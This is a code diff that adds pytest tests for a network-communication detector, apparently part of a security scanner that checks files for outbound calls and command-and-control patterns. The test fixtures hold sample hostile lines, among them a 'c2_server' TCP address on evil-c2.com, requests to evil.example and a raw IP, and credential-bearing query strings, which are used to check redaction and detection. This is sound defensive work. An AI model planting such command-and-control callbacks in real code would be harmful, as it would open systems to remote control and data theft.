@@ -4,7 +4,7 @@ import json
 import os
 from collections.abc import Iterator
 from pathlib import Path
-from urllib.parse import urlparse
+from urllib.parse import quote, urlparse
 
 import pytest
 
@@ -1878,6 +1878,32 @@ class TestNetworkCommDetector:
 
         assert network_finding["snippet"] == "requests.get https://evil.example/path"
 
+    @pytest.mark.parametrize(
+        ("data", "finding_type", "expected_snippet"),
+        [
+            (
+                b'requests.get("redis://45.33.32.156:6379/0")',
+                "network_function",
+                "requests.get redis://45.33.32.156:6379/0",
+            ),
+            (
+                b'c2_server = "tcp://evil-c2.com:4444/payload"',
+                "cc_pattern",
+                "c2_server tcp://evil-c2.com:4444/payload",
+            ),
+        ],
+    )
+    def test_network_snippets_preserve_sanitized_non_http_uri_context(
+        self,
+        data: bytes,
+        finding_type: str,
+        expected_snippet: str,
+    ) -> None:
+        findings = NetworkCommDetector().scan(data, "hook.py")
+        finding = next(item for item in findings if item["type"] == finding_type)
+
+        assert finding["snippet"] == expected_snippet
+
     def test_network_function_snippet_expansion_is_bounded_without_nearby_url_scheme(self) -> None:
         """Incidental matches in long binary blobs should not expand snippets across megabytes."""
         detector = NetworkCommDetector()
@@ -2612,6 +2638,57 @@ def test_delimiter_only_query_near_matches_preserve_endpoint_findings(
     findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")
 
     assert any(finding.get(finding_key) == value for finding in findings)
+
+
+@pytest.mark.parametrize("secret", ["45.33.32.156", "secret.example.com"])
+def test_plus_delimited_query_credentials_do_not_reappear(secret: str) -> None:
+    findings = NetworkCommDetector().scan(
+        f"https://evil.example/path?api_key+{secret}".encode(),
+        "tokens.txt",
+    )
+
+    assert secret not in json.dumps(findings, sort_keys=True)
+
+
+def test_plus_delimited_query_near_match_preserves_endpoint() -> None:
+    ip = "45.33.32.156"
+    findings = NetworkCommDetector().scan(
+        f"https://evil.example/path?algorithm+{ip}".encode(),
+        "tokens.txt",
+    )
+
+    assert any(finding.get("ip") == ip for finding in findings)
+
+
+@pytest.mark.parametrize("secret", ["45.33.32.156", "secret.example.com"])
+def test_split_source_url_credentials_do_not_reappear(secret: str) -> None:
+    data = f'requests.get("https://evil.example/api_key/" "{secret}/model.bin")'.encode()
+
+    findings = NetworkCommDetector().scan(data, "tokens.txt")
+
+    assert secret not in json.dumps(findings, sort_keys=True)
+
+
+def test_split_source_url_near_match_preserves_endpoint() -> None:
+    domain = "public.example.com"
+    data = f'requests.get("https://evil.example/algorithm/" "{domain}/model.bin")'.encode()
+
+    findings = NetworkCommDetector().scan(data, "tokens.txt")
+
+    assert any(finding.get("domain") == domain for finding in findings)
+
+
+def test_over_encoded_nested_url_is_not_silently_dropped() -> None:
+    nested_url = "https://evil-c2.com/payload"
+    encoded = nested_url
+    for _ in range(network_comm._MAX_PATH_TOKEN_DECODE_PASSES + 1):
+        encoded = quote(encoded, safe="")
+    data = f"https://benign.example/download?next={encoded}".encode()
+
+    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")
+
+    assert findings[0]["type"] == "url_detected"
+    assert findings[0]["url"] == nested_url
 
 
 @pytest.mark.parametrize(
